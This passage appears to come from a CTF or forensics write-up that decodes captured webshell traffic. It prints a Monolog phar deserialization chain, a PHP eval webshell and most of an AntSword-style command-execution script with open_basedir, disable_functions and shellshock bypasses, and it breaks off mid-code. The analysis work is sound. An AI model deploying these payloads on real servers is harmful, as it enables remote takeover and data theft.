class="line">P&#x3D;00D&#x3D;009&#x3D;00w&#x3D;00a&#x3D;00H&#x3D;00A&#x3D;00g&#x3D;00X&#x3D;001&#x3D;009&#x3D;00I&#x3D;00Q&#x3D;00U&#x3D;00x&#x3D;00U&#x3D;00X&#x3D;000&#x3D;00N&#x3D;00P&#x3D;00T&#x3D;00V&#x3D;00B&#x3D;00J&#x3D;00T&#x3D;00E&#x3D;00V&#x3D;00S&#x3D;00K&#x3D;00C&#x3D;00k&#x3D;007&#x3D;00I&#x3D;00D&#x3D;008&#x3D;00+&#x3D;00D&#x3D;00Q&#x3D;00o&#x3D;00J&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00C&#x3D;00y&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00Y&#x3D;00T&#x3D;00o&#x3D;00y&#x3D;00O&#x3D;00n&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00T&#x3D;00z&#x3D;00o&#x3D;00z&#x3D;00M&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00T&#x3D;00W&#x3D;009&#x3D;00u&#x3D;00b&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00x&#x3D;00I&#x3D;00Y&#x3D;00W&#x3D;005&#x3D;00k&#x3D;00b&#x3D;00G&#x3D;00V&#x3D;00y&#x3D;00X&#x3D;00F&#x3D;00N&#x3D;005&#x3D;00c&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00V&#x3D;00k&#x3D;00c&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;006&#x3D;00e&#x3D;003&#x3D;00M&#x3D;006&#x3D;00O&#x3D;00T&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00c&#x3D;002&#x3D;009&#x3D;00j&#x3D;00a&#x3D;002&#x3D;00V&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00P&#x3D;00O&#x3D;00j&#x3D;00I&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00J&#x3D;00N&#x3D;00b&#x3D;002&#x3D;005&#x3D;00v&#x3D;00b&#x3D;00G&#x3D;009&#x3D;00n&#x3D;00X&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00J&#x3D;00c&#x3D;00Q&#x3D;00n&#x3D;00V&#x3D;00m&#x3D;00Z&#x3D;00m&#x3D;00V&#x3D;00y&#x3D;00S&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00p&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;00x&#x3D;00M&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00a&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;007&#x3D;00c&#x3D;00j&#x3D;00o&#x3D;00z&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00l&#x3D;00N&#x3D;00p&#x3D;00e&#x3D;00m&#x3D;00U&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00k&#x3D;006&#x3D;00L&#x3D;00T&#x3D;00E&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00i&#x3D;00d&#x3D;00W&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00c&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00V&#x3D;00j&#x3D;00a&#x3D;00G&#x3D;008&#x3D;00g&#x3D;00X&#x3D;00j&#x3D;00w&#x3D;00&#x2F;&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00E&#x3D;00B&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00F&#x3D;00s&#x3D;00K&#x3D;00E&#x3D;00B&#x3D;00n&#x3D;00e&#x3D;00m&#x3D;00l&#x3D;00u&#x3D;00Z&#x3D;00m&#x3D;00x&#x3D;00h&#x3D;00d&#x3D;00G&#x3D;00U&#x3D;00o&#x3D;00Y&#x3D;00m&#x3D;00F&#x3D;00z&#x3D;00Z&#x3D;00T&#x3D;00Y&#x3D;000&#x3D;00X&#x3D;002&#x3D;00R&#x3D;00l&#x3D;00Y&#x3D;002&#x3D;009&#x3D;00k&#x3D;00Z&#x3D;00S&#x3D;00g&#x3D;00k&#x3D;00X&#x3D;001&#x3D;00B&#x3D;00P&#x3D;00U&#x3D;001&#x3D;00R&#x3D;00b&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;000&#x3D;00M&#x3D;00z&#x3D;00N&#x3D;00d&#x3D;00K&#x3D;00S&#x3D;00k&#x3D;00p&#x3D;00O&#x3D;00z&#x3D;009&#x3D;00e&#x3D;00P&#x3D;00i&#x3D;00A&#x3D;00+&#x3D;00I&#x3D;00C&#x3D;005&#x3D;00j&#x3D;00b&#x3D;002&#x3D;005&#x3D;00m&#x3D;00a&#x3D;00W&#x3D;00c&#x3D;00u&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00U&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00x&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00V&#x3D;00s&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00O&#x3D;00O&#x3D;003&#x3D;001&#x3D;009&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;004&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00Z&#x3D;00l&#x3D;00b&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00T&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;000&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00p&#x3D;00b&#x3D;00m&#x3D;00l&#x3D;000&#x3D;00a&#x3D;00W&#x3D;00F&#x3D;00s&#x3D;00a&#x3D;00X&#x3D;00p&#x3D;00l&#x3D;00Z&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00Y&#x3D;00j&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00k&#x3D;00x&#x3D;00p&#x3D;00b&#x3D;00W&#x3D;00l&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00i&#x3D;000&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00H&#x3D;00B&#x3D;00y&#x3D;00b&#x3D;002&#x3D;00N&#x3D;00l&#x3D;00c&#x3D;003&#x3D;00N&#x3D;00v&#x3D;00c&#x3D;00n&#x3D;00M&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00o&#x3D;00i&#x3D;00Y&#x3D;003&#x3D;00V&#x3D;00y&#x3D;00c&#x3D;00m&#x3D;00V&#x3D;00u&#x3D;00d&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00c&#x3D;003&#x3D;00l&#x3D;00z&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00t&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;009&#x3D;00f&#x3D;00X&#x3D;001&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;003&#x3D;00O&#x3D;003&#x3D;000&#x3D;00F&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00Z&#x3D;00H&#x3D;00V&#x3D;00t&#x3D;00b&#x3D;00X&#x3D;00k&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00I&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00C&#x3D;005&#x3D;000&#x3D;00e&#x3D;00H&#x3D;00Q&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;000&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;000&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00D&#x3D;00Z&#x3D;006&#x3D;00P&#x3D;00U&#x3D;00p&#x3D;00j&#x3D;00h&#x3D;00k&#x3D;00a&#x3D;00y&#x3D;00y&#x3D;00N&#x3D;00i&#x3D;00Q&#x3D;003&#x3D;00Y&#x3D;00w&#x3D;00m&#x3D;00f&#x3D;00p&#x3D;00c&#x3D;008&#x3D;00Q&#x3D;00J&#x3D;00n&#x3D;00s&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00E&#x3D;00d&#x3D;00C&#x3D;00T&#x3D;00U&#x3D;00I&#x3D;00&#x3D;00</span><br></pre></td></tr></table></figure><p>Replacing =00 to null then base64 decode it, we can get the webshell contents.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php __HALT_COMPILER(); ?&gt;</span><br><span class="line">�a:2:&#123;i:7;O:32:&quot;Monolog\Handler\SyslogUdpHandler&quot;:1:&#123;s:9:&quot;*socket&quot;;O:29:&quot;Monolog\Handler\BufferHandler&quot;:7:&#123;s:10:&quot;*handler&quot;;r:3;s:13:&quot;*bufferSize&quot;;i:-1;s:9:&quot;*buffer&quot;;a:1:&#123;i:0;a:2:&#123;i:0;s:77:&quot;echo ^&lt;?php @eval(@gzinflate(base64_decode($_POST[14433])));?^&gt; &gt; .config.php&quot;;s:5:&quot;level&quot;;N;&#125;&#125;s:8:&quot;*level&quot;;N;s:14:&quot;*initialized&quot;;b:1;s:14:&quot;*bufferLimit&quot;;i:-1;s:13:&quot;*processors&quot;;a:2:&#123;i:0;s:7:&quot;current&quot;;i:1;s:6:&quot;system&quot;;&#125;&#125;&#125;i:7;i:7;&#125;dummy\KKa~ضtest.txt\KKa~ضtesttest6z&#x3D;Jc�F��ؐ݌&amp;~�&lt;@��GBMB</span><br></pre></td></tr></table></figure><?php @eval(@gzinflate(base64_decode($_POST[14433])));?><p> are webshell.We can decode traffic after base64 and gzip decode.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">14433&#x3D;c0gtS8zRcEivysxLy0ksSdVISixONTOJT0lNzk9J1VCJD&#x2F;APDomON6gwSDFJNUpJNUs2TEs0j9XU1LQGAA&#x3D;&#x3D;</span><br><span class="line">_0x0d4e2de6c1fa7&#x3D;jVZtT9tIEP5+v2JZWcRWTZy3o5Q9U6MqVSvRAxF0fCiV5dhrsodjW7sOgUv8329m&#x2F;ZYA1ysI5JmdeXbeZz2RCl&#x2F;xwqSRUHkSPPtcykwqahM6oBbz4MwvxJL7iViKwhxYzMjySEjXQ8171MxynvrzQHFgg4qIzUrEIhsjC9eRC99psOSm4c+m139Nr7&#x2F;T2afrr1c3&#x2F;uevF9M&#x2F;z79N6Q8NG0jp5pLf+2AJ3EUdtj11qF2jMQ&#x2F;OwcB8pRZmJW1rfFs9K7TEL&#x2F;gy90HUtCwWZ5IHYSNIAkUMAedgE9h34Anlr6UognkCZukDaxNmaSHSFWclM4ol+qhP+tTpxzyKhpR5yweEr061pwdeLBLu8yehCtUc7EJ54WJXxWvjvRc1iHa&#x2F;D7EzwrTAKHh7YbiDn+2dg6GoYcA7MNsdMEP8ocQ&#x2F;PIOYV6qAId69szb1vRVs+Z&#x2F;3UgeTLJe7Ns4hcg+gUzIWr9KwEFkK8eNpCMFcFdZG8mIlU4IEyOyIACNfFaa1MaovN5vrvGA0eArxsRhweBr5YcKDFEgeLjJCx8e0TyfxiFa0110GII3QZARCcQxZKAFEga9wEyvk88bIXfTneOJHPMwibqrVXBXgj391Obv5TuOT42E0&#x2F;jAZvh+MJhP6wx5BfRjq50qreB6Nx7+fjE7i8SBulHj6CEKu91PV+WQ8mI+Hg5PxSfBh3Kj+ahuEbgMX2QN7aLku5OgjPQrJHd0Yqryj9JQ6OxSW4RsqUAIQPTDYpFfnN19c2odUtCS1+vTUWSnpJFkYJI6ai3SXbsnuQH9UJPzDquKJ4v97C&#x2F;t06tyKNMrWyoFGhYYaj3Z5s2d1e3l7PNnhvTjWKg3jKltzOVvwJHEeh&#x2F;2Bw9AQbETo&#x2F;eLZrDMELYhf2Er8KU8wSXS73QYqESmHD2i4RrKbFJWCHhWPek6QFvXRAkbjKWj5ksOwDBvUB&#x2F;5cgVIXkUGalWVpSBdylJcwBsOSdo0SQwnEYGDU2WZTu5unMIlxLvmNgqKWnjW1LZGldfUwNJssNAx&#x2F;GeRmr5Bi2bN3GGBykSUYup6NAKysmths7mgnWGwdHsJwhBpIquGIjAOR+tV9Rlzrd+7IVaowH2qRhQ9YgsQI6&#x2F;B1ZUkGNhlaxHUJlCY5PMQg9Kp49iykTWTo3eMn2T3wtlstswxE0rOsBrCQCAgJiyCTDzAboRQdtaAWxB6aEj7IgUs+n1&#x2F;Mprh+imVOXIJ7ATrPfL0nbNILVM9ibQ1&#x2F;ufIvLi9cE5TJEyMlA2fImcYZnR0O9Xp7ZSsIt5RJA4quspJgYsgGHQCmNxy97w&#x2F;gd4hl0vwdzR+xfhvZerJ+DoBiZT0AwYFqyeyNUjQJJvcq1XGoKDStUYIoUAjGJpciLbpZWt9wI3E3lfv37aU0XEawUqDSQAb3zC+OLyhTDE7V6BCZjVd9ApaNUHW91mJ5oFSxkCst2BBvi+oSgyrlIQpXXnkdE23dV2hEvfoY3go1bKX8dyZSk&#x2F;6Gz4sXmjmuSFQ14hw2MVKo35NQKOsFZAK3vl65cd7ZEkN6sH9yezSYnCCkl4dJprgW279AZqHfXoIV6rUsvIlUvTYk7ln92ctFzntQrese1Ozo7QM4MUT20kaRfR&#x2F;+eGWm5raWvtIYvakx6jS8uPatgme79Ahp7VDNe+F+APXb1UdLYQpbuTeHitV2CCayld1ffgduPWG8MIGKagYb&#x2F;XT5jWK4127K1wQos3c7C6XIi76+qYfr3TXWR2dNPcEbIXMNfnQ2K6JLfNcwvLbvAvvo7BpG0HmSIFPxRmoq5Y4U35Wq+7Cra91ZkHqYC800rt3SAK7XNKHs02b2aBCiUQ7cgfWRoqAGKuFRQBkrw6CAVTZ9CnmuO9ng1qZ6P02vry+vT+ER2UdjIaffuFLBPccVwrq3G4sEsv4F</span><br><span class="line">b430b310838a93&#x3D;4g</span><br><span class="line">f861d394170244&#x3D;X4Y21k</span><br><span class="line">ufbd335828f30f&#x3D;0bY2QgL2QgIkQ6XFxwaHBzdHVkeV9wcm9cXFdXV1xcc2VjcmV0IiYiQzpcUHJvZ3JhbSBGaWxlc1w3LVppcFw3ei5leGUiIHggc2VjcmV0LnppcCAtcFA0VWs2cWtoNkd2cXdnM3kmZWNobyAzNzhkZjJjMjM0JmNkJmVjaG8gZmI3Zjhm</span><br></pre></td></tr></table></figure><p>Above encryped data are webshell commands which executing extract zip file,decode it with base64 and gzip, we can get the source code of server send to client.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">$opdir&#x3D;@ini_get(&quot;open_basedir&quot;);</span><br><span class="line">if($opdir) &#123;</span><br><span class="line">$ocwd&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">$oparr&#x3D;preg_split(&quot;&#x2F;;|:&#x2F;&quot;,$opdir);</span><br><span class="line">@array_push($oparr,$ocwd,sys_get_temp_dir());</span><br><span class="line">foreach($oparr as $item) &#123;</span><br><span class="line">if(!@is_writable($item)) &#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">$tmdir&#x3D;$item.&quot;&#x2F;.fedd1&quot;;</span><br><span class="line">@mkdir($tmdir);</span><br><span class="line">if(!@file_exists($tmdir)) &#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">@chdir($tmdir);</span><br><span class="line">@ini_set(&quot;open_basedir&quot;, &quot;..&quot;);</span><br><span class="line">$cntarr&#x3D;@preg_split(&quot;&#x2F;\\\\|\&#x2F;&#x2F;&quot;,$tmdir);</span><br><span class="line">for ($i&#x3D;0;$i&lt;sizeof($cntarr);$i++) &#123;</span><br><span class="line">@chdir(&quot;..&quot;);</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">@ini_set(&quot;open_basedir&quot;,&quot;&#x2F;&quot;);</span><br><span class="line">@rmdir($tmdir);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">;</span><br><span class="line">function asenc($out) &#123;</span><br><span class="line">return $out;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function asoutput() &#123;</span><br><span class="line">$output&#x3D;ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line">echo &quot;36&quot;.&quot;4f2&quot;;</span><br><span class="line">echo @asenc($output);</span><br><span class="line">echo &quot;42&quot;.&quot;ff1&quot;;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line">try &#123;</span><br><span class="line">$p&#x3D;base64_decode(substr($_POST[&quot;f861d394170244&quot;],2));</span><br><span class="line">$s&#x3D;base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;],2));</span><br><span class="line">$envstr&#x3D;@base64_decode(substr($_POST[&quot;b430b310838a93&quot;],2));</span><br><span class="line">$d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">$c&#x3D;substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;?&quot;-c \&quot;&#123;$s&#125;\&quot;&quot;:&quot;&#x2F;c \&quot;&#123;$s&#125;\&quot;&quot;;</span><br><span class="line">if(substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;) &#123;</span><br><span class="line">@putenv(&quot;PATH&#x3D;&quot;.getenv(&quot;PATH&quot;).&quot;:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">@putenv(&quot;PATH&#x3D;&quot;.getenv(&quot;PATH&quot;).&quot;;C:&#x2F;Windows&#x2F;system32;C:&#x2F;Windows&#x2F;SysWOW64;C:&#x2F;Windows;C:&#x2F;Windows&#x2F;System32&#x2F;WindowsPowerShell&#x2F;v1.0&#x2F;;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(!empty($envstr)) &#123;</span><br><span class="line">$envarr&#x3D;explode(&quot;|||asline|||&quot;, $envstr);</span><br><span class="line">foreach($envarr as $v) &#123;</span><br><span class="line">if (!empty($v)) &#123;</span><br><span class="line">@putenv(str_replace(&quot;|||askey|||&quot;, &quot;&#x3D;&quot;, $v));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$r&#x3D;&quot;&#123;$p&#125; &#123;$c&#125;&quot;;</span><br><span class="line">function fe($f) &#123;</span><br><span class="line">$d&#x3D;explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;));</span><br><span class="line">if(empty($d)) &#123;</span><br><span class="line">$d&#x3D;array();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$d&#x3D;array_map(&#39;trim&#39;,array_map(&#39;strtolower&#39;,$d));</span><br><span class="line">&#125;</span><br><span class="line">return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function runshellshock($d, $c) &#123;</span><br><span class="line">if (substr($d, 0, 1) &#x3D;&#x3D; &quot;&#x2F;&quot; &amp;&amp; fe(&#39;putenv&#39;) &amp;&amp; (fe(&#39;error_log&#39;) || fe(&#39;mail&#39;))) &#123;</span><br><span class="line">if (strstr(readlink(&quot;&#x2F;bin&#x2F;sh&quot;), &quot;bash&quot;) !&#x3D; FALSE) &#123;</span><br><span class="line">$tmp &#x3D; tempnam(sys_get_temp_dir(), &#39;as&#39;);</span><br><span class="line">putenv(&quot;PHP_LOL&#x3D;() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1&quot;);</span><br><span class="line">if (fe(&#39;error_log&#39;)) &#123;</span><br><span class="line">error_log(&quot;a&quot;, 1);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">return False;</span><br><span class="line">&#125;</span><br><span class="line">$output &#x3D; @file_get_contents($tmp);</span><br><span class="line">@unlink($tmp);</span><br><span class="line">if ($output !&#x3D; &quot;&quot;) &#123;</span><br><span class="line">print($output);</span><br><span class="line">return True;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return False;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function runcmd($c) &#123;</span><br><span class="line">$ret&#x3D;0;</span><br><span class="line">$d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">if(fe(&#39;system&#39;)) &#123;</span><br><span class="line">@system($c,$ret);</span><br><span class="line">&#125; elseif(fe(&#39;passthru&#39;)) &#123;</span><br><span class="line">@passthru($c,$ret);</span><br><span class="line">&#125; elseif(fe(&#39;shell_exec&#39;)) &#123;</span><br><span class="line">print(@shell_exec($c));</span><br><span class="line">&#125; elseif(fe(&#39;exec&#39;)) &#123;</span><br><span class="line">@exec($c,$o,$ret);</span><br><span class="line">print(join(&quot;</span><br><span class="line">&quot;,$o));</span><br><span class="line">&#125; elseif(fe(&#39;popen&#39;)) &#123;</span><br><span class="line">$fp&#x3D;@popen($c,&#39;r&#39;);</span><br><span class="line">while(!@feof($fp)) &#123;</span><br><span class="line">print(@fgets($fp,2048));</span><br><span class="line">&#125;</span><br><span class="line">@pclose($fp);</span><br><span class="line">&#125; elseif(fe(&#39;proc_open&#39;)) &#123;</span><br><span class="line">$p &#x3D; @proc_open($c, array(1 &#x3D;&gt; array(&#39;pipe&#39;, &#39;w&#39;), 2 &#x3D;&gt; array(&#39;pipe&#39;, &#39;w&#39;)), $io);</span><br><span class="line">while(!@feof($io[1])) &#123;</span><br><span class="line">print(@fgets($io[1],2048));</span><br><span class="line">&#125;</span><br><span class="line">while(!@feof($io[2])) 